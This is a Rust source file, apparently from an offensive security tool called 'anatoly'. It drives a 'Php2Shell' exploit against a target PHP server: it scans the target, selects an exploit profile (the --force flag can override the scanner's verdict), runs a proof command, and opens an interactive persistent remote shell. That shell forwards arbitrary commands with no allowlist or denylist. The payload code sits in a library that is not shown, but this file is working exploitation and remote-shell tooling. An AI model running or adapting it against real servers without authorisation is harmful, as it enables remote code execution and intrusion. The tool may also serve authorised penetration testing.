use crate::{
    cli::{ConnectArgs, ExploitArgs},
    exports, runner,
};
use anatoly::{
    exploit::{ExploitMode, ExploitReport, Php2ShellBackend, Php2ShellProfile},
    http::validate_url,
    scan::{ScanReport, Scanner},
    ui::{Ui, safe_text},
};
use anyhow::{Result, bail};
use reqwest::Url;
use std::io::{self, Write};

pub fn exploit(args: ExploitArgs, json: bool, ui: &Ui) -> Result<u8> {
    run_exploit(ExploitMode::Exploit, args, "id".to_owned(), json, ui)
}

pub fn connect(args: ConnectArgs, json: bool, ui: &Ui) -> Result<u8> {
    if let Some(command) = args.command {
        return run_exploit(ExploitMode::Connect, args.exploit, command, json, ui);
    }
    if json || args.exploit.scan.output.is_some() {
        bail!("Interactive connect requires neither --json nor --output; use --command");
    }
    interactive(args.exploit, ui)
}

struct PreparedExecution {
    target: Url,
    backend: Php2ShellBackend,
    profile: Php2ShellProfile,
    scan: ScanReport,
    forced: bool,
}

fn run_exploit(
    mode: ExploitMode,
    args: ExploitArgs,
    command: String,
    json: bool,
    ui: &Ui,
) -> Result<u8> {
    let prepared = prepare(&args, json, ui)?;
    let proof = prepared.backend.execute(&prepared.target, command)?;
    let report = ExploitReport::new(
        mode,
        &prepared.target,
        &prepared.profile,
        proof,
        prepared.forced,
        &prepared.scan,
    );
    if let Some(path) = &args.scan.output {
        runner::write_new(path, &report)?;
    }
    if json {
        println!("{}", serde_json::to_string_pretty(&report)?);
    } else {
        ui.details("ANATOLY / PHP2SHELL PROOF", &serde_json::to_value(&report)?);
    }
    Ok(0)
}

fn execution_target(args: &ExploitArgs) -> Result<Url> {
    let targets = runner::target_inputs(&args.scan.input, 1)?;
    validate_url(&targets[0])
}

fn prepare(args: &ExploitArgs, json: bool, ui: &Ui) -> Result<PreparedExecution> {
    if args.scan.dry_run {
        bail!(
            "Exploit/connect cannot use --dry-run: profile selection requires scanner evidence; no requests or payloads were sent"
        );
    }
    if args.scan.jsonl {
        bail!("Exploit/connect does not support --jsonl; use --json for the execution report");
    }
    if args.scan.csv.is_some() || args.scan.sarif.is_some() {
        bail!(
            "Exploit/connect CSV/SARIF exports are unsupported; use --output for the execution report"
        );
    }

    // Target, output and runtime safeguards run before the first HTTP request.
    let target = execution_target(args)?;
    exports::preflight(&[args.scan.output.as_deref()])?;
    let (limits, options) = runner::configure(&args.scan)?;
    runner::validate_scope(&[target.as_str().to_owned()], &options)?;

    let scan = Scanner::new()?.scan(target.as_str(), limits, &options)?;
    if !json && !args.scan.summary_only {
        ui.report(1, 1, &scan);
    }
    let profile = Php2ShellProfile::select_from_scan(
        scan.version.as_ref(),
        scan.version_status,
        &scan.verdict,
        args.force,
    )?;
    let backend = Php2ShellBackend::with_profile(profile.clone())?;
    Ok(PreparedExecution {
        target,
        backend,
        profile,
        scan,
        forced: args.force,
    })
}

fn interactive(args: ExploitArgs, ui: &Ui) -> Result<u8> {
    let prepared = prepare(&args, false, ui)?;
    let mut shell =
        anatoly::exploit_session::PersistentShell::start(&prepared.backend, &prepared.target)?;
    ui.details(
        "ANATOLY / PHP2SHELL SESSION",
        &serde_json::json!({
            "target": prepared.target.as_str(),
            "php_version": prepared.profile.php_version,
            "profile": prepared.profile.name,
            "forced": prepared.forced,
            "command_policy": "Commands are passed to the persistent shell without an allowlist or denylist",
            "session": "One target-side sh process preserves cwd and environment. Type help for local commands.",
            "persistent_shell": true,
            "tty": false,
        }),
    );
    let stdin = io::stdin();
    let mut history = Vec::<String>::new();
    loop {
        print!("anatoly:{}$ ", shell.cwd());
        io::stdout().flush()?;
        let mut input = String::new();
        if stdin.read_line(&mut input)? == 0 {
            println!();
            break;
        }
        let input = input.trim();
        match input {
            "" => continue,
            "exit" | "quit" => break,
            "help" => {
                println!("Remote commands run in the same persistent target-side sh process.");
                println!("Local commands: help, history, clear, exit, quit");
                continue;
            }
            "history" => {
                for (index, command) in history.iter().enumerate() {
                    println!("{:>4}  {}", index + 1, safe_text(command));
                }
                continue;
            }
            "clear" => {
                print!("\x1b[2J\x1b[H");
                io::stdout().flush()?;
                continue;
            }
            _ => {}
        }
        history.push(input.to_owned());
        match shell.execute(input) {
            Ok(result) => {
                if !result.proof.output.is_empty() {
                    println!("{}", safe_text(&result.proof.output));
                }
                if result.exit_status != 0 {
                    eprintln!("anatoly: remote exit status {}", result.exit_status);
                }
            }
            Err(error) => eprintln!("anatoly: {}", safe_text(&format!("{error:#}"))),
        }
    }
    shell.close()?;
    Ok(0)
}
